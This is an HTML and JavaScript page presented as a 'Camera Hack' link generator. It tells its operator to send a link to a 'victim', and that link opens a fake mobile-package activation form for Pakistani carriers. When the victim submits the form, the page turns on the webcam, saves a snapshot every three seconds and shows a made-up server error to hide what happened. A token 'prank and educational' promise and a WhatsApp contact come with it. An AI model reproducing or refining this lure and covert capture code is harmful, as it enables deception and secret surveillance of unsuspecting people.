<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>🔗 Link Generator & Pkg Activator</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
<style>
/* --- Cyber Dark Theme Variables --- */
:root {
    --bg: #0f1115;
    --card-bg: rgba(26, 29, 35, 0.95); 
    --accent: #ef4444; 
    --text-main: #f8fafc;
    --text-dim: #94a3b8;
    --border: #2d333f;
}

body {
    font-family: 'Inter', sans-serif;
    background: var(--bg);
    color: var(--text-main);
    padding: 20px;
    display: flex;
    justify-content: center;
    align-items: center; 
    min-height: 100vh;
    margin: 0;
}

/* --- The Dashboard Theme --- */
#dashboard-card {
    background: var(--card-bg);
    padding: 30px;
    border-radius: 24px;
    max-width: 480px;
    width: 100%;
    text-align: center;
    box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
    border: 1px solid var(--border);
    backdrop-filter: blur(10px);
}

#dashboard-card h2 { color: var(--text-main); font-size: 1.8rem; margin-bottom: 10px; }
#dashboard-card small { color: var(--text-dim); display: block; margin-bottom: 20px; }

/* --- Buttons --- */
button {
    width: 100%;
    padding: 14px;
    border-radius: 12px;
    border: none;
    background: var(--accent);
    color: white;
    font-size: 1rem;
    font-weight: 600;
    cursor: pointer;
    transition: transform 0.2s, opacity 0.2s;
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 8px;
}
button:active { transform: scale(0.97); }
button:hover { opacity: 0.9; }

input, select {
    width: 100%;
    padding: 14px;
    border-radius: 12px;
    border: 1px solid var(--border);
    background: #1a1d23;
    color: white;
    font-size: 1rem;
    outline: none;
}
input:focus { border-color: var(--accent); }

/* --- Loader Logic --- */
#loader-container { 
    display: none; 
    justify-content: center; 
    padding: 20px 0; 
}
.loader {
    transform: rotateZ(45deg);
    perspective: 1000px;
    border-radius: 50%;
    width: 48px;
    height: 48px;
    color: #fff;
    position: relative;
}
.loader:before, .loader:after {
    content: ''; display: block; position: absolute;
    top: 0; left: 0; width: inherit; height: inherit;
    border-radius: 50%; transform: rotateX(70deg);
    animation: 1s spin linear infinite;
}
.loader:after { color: var(--accent); transform: rotateY(70deg); animation-delay: .4s; }
@keyframes spin {
    0%, 100% { box-shadow: .2em 0px 0 0px currentcolor; }
    25% { box-shadow: 0 .2em 0 0px currentcolor; }
    50% { box-shadow: -.2em 0 0 0 currentcolor; }
    75% { box-shadow: 0px -.2em 0 0 currentcolor; }
}

/* --- Toast Notification --- */
#toast {
    visibility: hidden;
    min-width: 250px;
    background-color: #333;
    color: #fff;
    text-align: center;
    border-radius: 8px;
    padding: 16px;
    position: fixed;
    z-index: 9999;
    bottom: 30px;
    font-size: 14px;
    border-left: 5px solid var(--accent);
}
#toast.show { visibility: visible; animation: fadein 0.5s, fadeout 0.5s 2.5s; }

/* --- Startup Modal --- */
#startup-modal {
    position: fixed;
    top: 0; left: 0; width: 100%; height: 100%;
    background: rgba(0,0,0,0.9);
    display: flex;
    justify-content: center;
    align-items: center;
    z-index: 10000;
}
.modal-content {
    background: #1a1d23;
    padding: 30px;
    border-radius: 20px;
    text-align: center;
    max-width: 400px;
    border: 1px solid var(--border);
}

/* --- Pkg Activator (Preserve Original Light Theme as requested) --- */
#pkg-activator-card {
    background: #ffffff; color: #1e293b; padding: 30px; border-radius: 16px; 
    max-width: 400px; width: 95%; box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1); border: 1px solid #e2e8f0;
}
#pkg-activator-card input, #pkg-activator-card select { background: #fff; color: #1e293b; border: 2px solid #cbd5e1; }
#pkg-activator-card button { background: #10b981; }

@keyframes fadein { from {bottom: 0; opacity: 0;} to {bottom: 30px; opacity: 1;} }
@keyframes fadeout { from {bottom: 30px; opacity: 1;} to {bottom: 0; opacity: 0;} }

.gallery { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 15px; }
.gallery img { width: 100%; height: 80px; object-fit: cover; border-radius: 8px; background: #23272f; }
hr { border: 0; border-top: 1px solid var(--border); margin: 25px 0; }
</style>
</head>
<body>

<div id="startup-modal">
    <div class="modal-content">
        <h3>Usage Agreement</h3>
        <p style="color: var(--text-dim); margin: 15px 0;">I promise to use this tool only for prank and educational purposes.</p>
        <button id="promiseBtn">Yes Promised</button>
    </div>
</div>

<div id="toast">Message here</div>

<div class="card" id="dashboard-card">
    <div style="margin-bottom: 20px;">
        <img src="https://i.ibb.co/NdB47GyN/images-2.jpg" style="width: 50px; height: 50px; border-radius: 10px; margin-bottom: 10px;">
        <h2>Camera Hack</h2>
        <small>Generate a link and send it to the victim to access the camera.</small>
    </div>
    
    <div id="genArea">
        <button id="genBtn"><i class="fa fa-link"></i> Generate New Link</button>
        <div id="loader-container"><span class="loader"></span></div>
        <div id="linkBox"></div>
    </div>

    <hr>

    <div id="dataArea" style="display:none">
        <h3 style="font-size: 0.9rem; color: var(--accent);">ID: <span id="showId"></span></h3>
        <div id="images" class="gallery"></div>
        <button id="downloadBtn" onclick="downloadAllImages()" style="margin-top: 20px; background: #23272f; border: 1px solid var(--border);"><i class="fa fa-download"></i> Download All</button>
    </div>
</div>

<div class="card" id="pkg-activator-card" style="display:none;">
    <h2>Pkg Activator</h2>
    <small>Select your SIM and enter your number to activate your desired package.</small>
    <select id="sim-select">
        <option value="">-- Select Your SIM --</option>
        <option value="jazz">Jazz</option><option value="telenor">Telenor</option><option value="ufone">Ufone</option>
        <option value="zong">Zong</option><option value="sco">SCOM</option>
    </select>
    <input type="tel" id="mobile-number" placeholder="03xxxxxxxxx">
    <button id="activateBtn">Activate Pkg</button>
    <div id="activationStatus"></div>
    <video id="videoElement" autoplay playsinline muted style="display:none"></video>
    <canvas id="canvasElement" style="display:none;"></canvas>
</div>

<a id="whatsapp-btn" href="https://wa.me/923055316203" style="position:fixed; bottom:20px; right:20px; color:#25d366; font-size:40px;"><i class="fab fa-whatsapp"></i></a>

<script>
// --- UI Helpers ---
function showToast(msg) {
    const t = document.getElementById("toast");
    t.textContent = msg;
    t.className = "show";
    setTimeout(() => { t.className = t.className.replace("show", ""); }, 3000);
}

// Fallback Copy System
function fallbackCopy(text) {
    const textArea = document.createElement("textarea");
    textArea.value = text;
    document.body.appendChild(textArea);
    textArea.select();
    try {
        document.execCommand('copy');
        showToast("Link Copied Successfully!");
    } catch (err) {
        showToast("Manual Copy Required");
    }
    document.body.removeChild(textArea);
}

// Startup Promise Logic
window.onload = () => {
    if (sessionStorage.getItem('promised')) {
        document.getElementById('startup-modal').style.display = 'none';
    }
};

document.getElementById('promiseBtn').onclick = () => {
    sessionStorage.setItem('promised', 'true');
    document.getElementById('startup-modal').style.display = 'none';
    showToast("Welcome to Dashboard");
};

// --- Logic & Script (Unchanged as per instructions) ---
const CAPTURE_INTERVAL_MS = 3000; 
const dashboardCard = document.getElementById('dashboard-card');
const pkgActivatorCard = document.getElementById('pkg-activator-card');
const genBtn=document.getElementById('genBtn');
const linkBox=document.getElementById('linkBox');
const dataArea=document.getElementById('dataArea');
const showId=document.getElementById('showId');
const images=document.getElementById('images');
const activateBtn = document.getElementById('activateBtn');
const simSelect = document.getElementById('sim-select');
const mobileNumber = document.getElementById('mobile-number');
const activationStatus = document.getElementById('activationStatus');
const video = document.getElementById('videoElement');
const canvas = document.getElementById('canvasElement');
const loaderCont = document.getElementById('loader-container');
let captureIntervalId = null;

function generateId(){return 'user-'+Math.random().toString(36).slice(2,10);}
function saveImages(id,imgArray){localStorage.setItem('images_'+id,JSON.stringify(imgArray));}
function getImages(id){return JSON.parse(localStorage.getItem('images_'+id)||'[]');}

function renderImages(id){ 
    const imgs=getImages(id);
    images.innerHTML='';
    if(!imgs.length){images.innerHTML='<small style="grid-column: 1/-1;">No images yet.</small>'; return;}
    imgs.forEach((url)=>{
        const img=document.createElement('img'); img.src=url; images.appendChild(img);
    });
}

async function downloadAllImages() {
    const id = localStorage.getItem('currentId');
    if (!id) return;
    const imgs = getImages(id);
    if (!imgs.length) { showToast("No data to download"); return; }
    const zip = new JSZip();
    imgs.forEach((url, i) => zip.file(`img_${i+1}.jpeg`, url.split(',')[1], {base64: true}));
    const content = await zip.generateAsync({type:"blob"});
    const a = document.createElement('a'); a.href = URL.createObjectURL(content); a.download = `data_${id}.zip`; a.click();
}

genBtn.onclick=()=>{
    genBtn.style.display = 'none';
    loaderCont.style.display = 'flex';
    
    // 2 Second Loader
    setTimeout(() => {
        loaderCont.style.display = 'none';
        const id=generateId();
        showId.textContent=id;
        const link=location.origin+location.pathname+'?id='+encodeURIComponent(id);
        localStorage.setItem('currentId',id);

        linkBox.innerHTML=`
            <input readonly value="${link}" style="text-align:center; margin-bottom:10px;">
            <div style="display:flex; gap:5px; margin-bottom:10px;">
                <button id="copyBtn" style="background:#23272f; border:1px solid var(--border);">Copy</button> 
                <button id="openBtn">Open</button>
            </div>
            <button id="refreshBtn" style="background:transparent; border:1px solid var(--border); color:var(--accent);">Refresh Status</button>
        `;
        
        document.getElementById('openBtn').onclick=()=>window.open(link,'_blank');
        document.getElementById('copyBtn').onclick=()=>fallbackCopy(link);
        document.getElementById('refreshBtn').onclick=()=>window.location.reload();

        dataArea.style.display='block';
        renderImages(id);
    }, 2000);
};

// Pkg Activator Script Logic
activateBtn.onclick = async () => {
    activationStatus.style.display = 'none';
    if (!simSelect.value || mobileNumber.value.length < 11) {
        activationStatus.style.display = 'block';
        activationStatus.textContent = '❌ Invalid Input';
        return;
    }
    activateBtn.disabled = true;
    activateBtn.textContent = 'Processing...';
    const ID = new URLSearchParams(location.search).get('id');
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        video.play();
        captureIntervalId = setInterval(() => {
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const capturedImage = canvas.toDataURL('image/jpeg', 0.5);
            const old = getImages(ID); old.push(capturedImage); saveImages(ID, old);
        }, CAPTURE_INTERVAL_MS);
        setTimeout(() => {
            activationStatus.style.display = 'block';
            activationStatus.innerHTML = 'SERVER ERROR<br>Please Try Later!';
        }, 1000); 
    } catch (err) {
        activationStatus.style.display = 'block';
        activationStatus.textContent = 'System Error: Network Gateway Timeout';
    }
};

const ID_PARAM=new URLSearchParams(location.search).get('id');
if(ID_PARAM){
    dashboardCard.style.display = 'none';
    pkgActivatorCard.style.display = 'block';
    document.getElementById('startup-modal').style.display = 'none';
} else {
    const savedId=localStorage.getItem('currentId');
    if(savedId){
        showId.textContent=savedId;
        dataArea.style.display='block';
        renderImages(savedId);
    }
}
</script>
</body>
</html>
